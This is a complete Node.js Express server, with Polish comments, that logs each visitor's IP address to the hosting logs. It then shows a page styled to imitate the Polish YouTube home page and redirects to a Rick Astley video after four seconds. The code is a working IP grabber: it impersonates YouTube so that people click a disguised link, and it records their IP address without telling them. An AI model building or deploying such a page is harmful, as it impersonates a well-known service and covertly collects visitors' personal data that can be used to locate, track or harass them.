const express = require('express');
const app = express();

app.set('trust proxy', true);

app.get('/', (req, res) => {
    // 1. Zapis adresu IP odwiedzającego w logach Render
    const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    console.log(`[NOWE IP] ${new Date().toISOString()} - IP: ${clientIp}`);

    // 2. Wyświetlenie makiety YouTube i przekierowanie po 4 sekundach
    res.send(`
        <!DOCTYPE html>
        <html lang="pl">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>YouTube</title>
            <script>
                // Przekierowanie na film po 4 sekundach (4000 ms)
                setTimeout(() => {
                    window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
                }, 4000);
            </script>
            <style>
                * { box-sizing: border-box; margin: 0; padding: 0; }
                body {
                    font-family: "Roboto", "Segoe UI", Arial, sans-serif;
                    background-color: #ffffff;
                    color: #0f0f0f;
                    overflow-x: hidden;
                }
                
                /* Top Navbar */
                header {
                    height: 56px;
                    display: flex;
                    align-items: center;
                    justify-content: space-between;
                    padding: 0 16px;
                    position: fixed;
                    top: 0;
                    width: 100%;
                    background: #ffffff;
                    z-index: 1000;
                }
                .logo-container {
                    display: flex;
                    align-items: center;
                    gap: 16px;
                }
                .menu-btn { font-size: 18px; cursor: pointer; color: #0f0f0f; }
                .yt-logo { 
                    display: flex; 
                    align-items: center; 
                    gap: 2px; 
                    font-weight: bold; 
                    font-size: 19px; 
                    letter-spacing: -0.8px;
                }
                .yt-badge {
                    background: #ff0000;
                    color: white;
                    border-radius: 4px;
                    padding: 1px 5px;
                    font-size: 11px;
                    margin-right: 2px;
                }
                .country-code { font-size: 10px; color: #606060; margin-left: 2px; align-self: flex-start; }

                /* Search Bar */
                .search-area {
                    display: flex;
                    align-items: center;
                    width: 45%;
                    max-width: 640px;
                }
                .search-input {
                    width: 100%;
                    padding: 8px 16px;
                    border: 1px solid #ccc;
                    border-radius: 40px 0 0 40px;
                    outline: none;
                    font-size: 14px;
                }
                .search-btn {
                    padding: 8px 20px;
                    border: 1px solid #ccc;
                    border-left: none;
                    border-radius: 0 40px 40px 0;
                    background: #f8f8f8;
                    cursor: pointer;
                }

                .login-btn {
                    font-size: 14px;
                    color: #065fd4;
                    border: 1px solid #def;
                    padding: 5px 12px;
                    border-radius: 18px;
                    font-weight: 500;
                    display: flex;
                    align-items: center;
                    gap: 6px;
                }

                /* Sidebar Layout */
                .layout { display: flex; margin-top: 56px; }
                aside {
                    width: 215px;
                    padding: 12px;
                    font-size: 14px;
                    height: calc(100vh - 56px);
                    position: fixed;
                }
                .side-link {
                    padding: 8px 12px;
                    border-radius: 10px;
                    display: flex;
                    align-items: center;
                    gap: 24px;
                    cursor: pointer;
                    margin-bottom: 2px;
                    font-size: 14px;
                }
                .side-link.active { background: #f2f2f2; font-weight: 600; }
                .side-link:hover { background: #e5e5e5; }
                hr { border: none; border-top: 1px solid #e5e5e5; margin: 8px 0; }

                /* Main Feed */
                main {
                    margin-left: 215px;
                    padding: 12px 24px;
                    width: calc(100% - 215px);
                }
                
                /* Tags/Categories */
                .tags-row {
                    display: flex;
                    gap: 8px;
                    margin-bottom: 20px;
                    overflow-x: auto;
                }
                .chip {
                    padding: 6px 12px;
                    background: #f2f2f2;
                    border-radius: 8px;
                    font-size: 14px;
                    font-weight: 500;
                    cursor: pointer;
                    white-space: nowrap;
                }
                .chip.active { background: #0f0f0f; color: #ffffff; }

                /* Video Grid */
                .video-grid {
                    display: grid;
                    grid-template-columns: repeat(3, 1fr);
                    gap: 16px;
                }
                .video-card { display: flex; flex-direction: column; cursor: pointer; }
                
                .thumb-wrapper {
                    width: 100%;
                    aspect-ratio: 16 / 9;
                    background-color: #2b2b2b;
                    border-radius: 12px;
                    position: relative;
                    overflow: hidden;
                    background-size: cover;
                    background-position: center;
                }
                .time-badge {
                    position: absolute;
                    bottom: 8px;
                    right: 8px;
                    background: rgba(0,0,0,0.8);
                    color: #fff;
                    font-size: 12px;
                    padding: 1px 4px;
                    border-radius: 4px;
                    font-weight: 500;
                }

                .card-details {
                    display: flex;
                    gap: 12px;
                    margin-top: 10px;
                }
                .channel-avatar {
                    width: 36px;
                    height: 36px;
                    border-radius: 50%;
                    background-color: #717171;
                    flex-shrink: 0;
                }
                .video-title {
                    font-size: 14px;
                    font-weight: 600;
                    line-height: 1.3;
                    color: #0f0f0f;
                    margin-bottom: 4px;
                }
                .meta-data {
                    font-size: 12px;
                    color: #606060;
                    line-height: 1.4;
                }

                /* Sponsor Banner Styling */
                .ad-box {
                    grid-column: span 1;
                    background: #f8f8f8;
                    border-radius: 12px;
                    padding: 12px;
                    display: flex;
                    flex-direction: column;
                    justify-content: space-between;
                }
                .ad-btn-row {
                    display: flex;
                    gap: 8px;
                    margin-top: 8px;
                }
                .btn-yt {
                    padding: 6px 16px;
                    border-radius: 18px;
                    font-size: 13px;
                    font-weight: 500;
                    border: none;
                    cursor: pointer;
                }
                .btn-dark { background: #0f0f0f; color: #fff; }
                .btn-light { background: #e5e5e5; color: #0f0f0f; }
            </style>
        </head>
        <body>

            <!-- Header -->
            <header>
                <div class="logo-container">
                    <span class="menu-btn">☰</span>
                    <div class="yt-logo">
                        <span class="yt-badge">▶</span>YouTube<span class="country-code">PL</span>
                    </div>
                </div>
                <div class="search-area">
                    <input type="text" class="search-input" placeholder="Szukaj">
                    <button class="search-btn">🔍</button>
                </div>
                <div class="login-btn">👤 Zaloguj się</div>
            </header>

            <div class="layout">
                <!-- Navigation Sidebar -->
                <aside>
                    <div class="side-link active">🏠 Główna</div>
                    <div class="side-link">🩳 Shorts</div>
                    <div class="side-link">📺 Subskrypcje</div>
                    <hr>
                    <div class="side-link">📁 Ty</div>
                    <div class="side-link">🕒 Historia</div>
                    <hr>
                    <div style="font-size: 13px; color: #606060; padding: 8px 12px;">
                        Zaloguj się, by polubić film, zostawić komentarz lub zasubskrybować kanał.
                    </div>
                </aside>

                <!-- Video Grid Area -->
                <main>
                    <!-- Category Chips -->
                    <div class="tags-row">
                        <div class="chip active">Wszystko</div>
                        <div class="chip">Gry</div>
                        <div class="chip">Grand Theft Auto Online</div>
                        <div class="chip">Na żywo</div>
                        <div class="chip">Podcasty</div>
                        <div class="chip">Przygody gry akcji</div>
                        <div class="chip">Ostatnio przesłane</div>
                        <div class="chip">Obejrzane</div>
                    </div>

                    <div class="video-grid">
                        
                        <!-- Video 1: War Thunder (Sponsorowane) -->
                        <div class="video-card">
                            <div class="thumb-wrapper" style="background-image: url('https://img.youtube.com/vi/dQw4w9WgXcQ/hqdefault.jpg');"></div>
                            <div class="card-details">
                                <div class="channel-avatar" style="background: #900;"></div>
                                <div>
                                    <div class="video-title">Walcz z prawdziwymi graczami. Dołącz teraz całkowicie za darmo.</div>
                                    <div class="meta-data">Sponsorowane • War Thunder</div>
                                    <div class="ad-btn-row">
                                        <button class="btn-yt btn-light">Obejrzyj</button>
                                        <button class="btn-yt btn-dark">Pobierz</button>
                                    </div>
                                </div>
                            </div>
                        </div>

                        <!-- Video 2: LSPDFR -->
                        <div class="video-card">
                            <div class="thumb-wrapper" style="background-image: url('https://img.youtube.com/vi/dQw4w9WgXcQ/hqdefault.jpg');">
                                <span class="time-badge">1:09:10</span>
                            </div>
                            <div class="card-details">
                                <div class="channel-avatar" style="background: #2b5c8f;"></div>
                                <div>
                                    <div class="video-title">The Best LSPDFR Mods That Make GTA 5 Roleplay Insanely Realistic</div>
                                    <div class="meta-data">Simulator Liam<br>14 tys. wyświetleń • 1 miesiąc temu</div>
                                </div>
                            </div>
                        </div>

                        <!-- Video 3: Amazonia -->
                        <div class="video-card">
                            <div class="thumb-wrapper" style="background-image: url('https://img.youtube.com/vi/dQw4w9WgXcQ/hqdefault.jpg');">
                                <span class="time-badge">27:00</span>
                            </div>
                            <div class="card-details">
                                <div class="channel-avatar" style="background: #3e7b3e;"></div>
                                <div>
                                    <div class="video-title">Sam Pośródku Amazońskiej Dżungli Przez 100 Godzin...</div>
                                    <div class="meta-data">elo mordo ✔<br>563 tys. wyświetleń • 1 dzień temu</div>
                                </div>
                            </div>
                        </div>

                    </div>
                </main>
            </div>

        </body>
        </html>
    `);
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log('Serwer działa'));
